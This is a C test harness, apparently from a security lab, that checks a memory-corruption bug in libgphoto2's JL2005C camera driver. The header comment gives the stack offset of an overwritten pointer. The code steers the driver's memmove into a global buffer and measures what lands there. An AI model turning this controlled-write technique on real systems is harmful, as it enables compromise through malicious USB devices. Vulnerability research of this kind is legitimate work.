/* W190 lab probe: real clang-built libgphoto2 2.5.34 + the committed vusb
 * p-mode patch. The device reply overwrites jl2005c_init's spilled `priv`
 * pointer (clang frame: rbp-0x20, bulk offset 0x3E30); the pinned :154
 * memmove then writes to priv+0x40. M2SHELL_JL2005_TOP supplies that pointer
 * as device bytes so the destination is this probe's global sink. */
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <gphoto2/gphoto2.h>
#include <gphoto2/gphoto2-port-info-list.h>

unsigned char m2s_sink[0x6000];

static void report(const char *when)
{
	size_t i, n5a = 0, first = (size_t)-1, last = (size_t)-1;
	printf("%s SINK=%p DEV_TOP=%s\n", when, (void *)m2s_sink,
	       getenv("M2SHELL_JL2005_TOP") ? getenv("M2SHELL_JL2005_TOP") : "-");
	for (i = 0; i < 0x4200; i++) if (m2s_sink[i] == 0x5a) {
		n5a++;
		if (first == (size_t)-1) first = i;
		last = i;
	}
	printf("COUNT_5A_IN_0x4200=%zu FIRST_5A=%zu LAST_5A=%zu\n",
	       n5a, first, last);
	printf("SINK[0x1D0..0x1D7]="
	       "%02x%02x%02x%02x%02x%02x%02x%02x\n",
	       m2s_sink[0x1d0], m2s_sink[0x1d1], m2s_sink[0x1d2],
	       m2s_sink[0x1d3], m2s_sink[0x1d4], m2s_sink[0x1d5],
	       m2s_sink[0x1d6], m2s_sink[0x1d7]);
	printf("SINK[0x3FF0..0x3FF7]="
	       "%02x%02x%02x%02x%02x%02x%02x%02x\n",
	       m2s_sink[0x3ff0], m2s_sink[0x3ff1], m2s_sink[0x3ff2],
	       m2s_sink[0x3ff3], m2s_sink[0x3ff4], m2s_sink[0x3ff5],
	       m2s_sink[0x3ff6], m2s_sink[0x3ff7]);
	fflush(stdout);
}

static void on_segv(int sig)
{
	(void)sig;
	report("SIGSEGV_AFTER_MEMMOVE");
	_exit(0);
}

int main(void)
{
	Camera *cam = NULL;
	CameraAbilitiesList *al = NULL;
	CameraAbilities ab;
	GPPortInfoList *il = NULL;
	GPPortInfo pi;
	int m, idx, rc;

	setvbuf(stdout, NULL, _IONBF, 0);
	signal(SIGSEGV, on_segv);
	memset(m2s_sink, 0x11, sizeof(m2s_sink));
	report("BEFORE");

	if (gp_camera_new(&cam) < GP_OK) return 2;
	if (gp_abilities_list_new(&al) < GP_OK) return 2;
	if (gp_abilities_list_load(al, NULL) < GP_OK) return 2;
	m = gp_abilities_list_lookup_model(al, " JL2005B/C/D camera");
	if (m < 0) return 2;
	if (gp_abilities_list_get_abilities(al, m, &ab) < GP_OK) return 2;
	if (gp_camera_set_abilities(cam, ab) < GP_OK) return 2;
	if (gp_port_info_list_new(&il) < GP_OK) return 2;
	if (gp_port_info_list_load(il) < GP_OK) return 2;
	idx = gp_port_info_list_lookup_path(il, "usb:001,001");
	if (idx < 0) return 2;
	if (gp_port_info_list_get_info(il, idx, &pi) < GP_OK) return 2;
	if (gp_camera_set_port_info(cam, pi) < GP_OK) return 2;

	rc = gp_camera_init(cam, NULL);
	printf("gp_camera_init rc=%d\n", rc);
	report("AFTER_INIT");
	return 0;
}
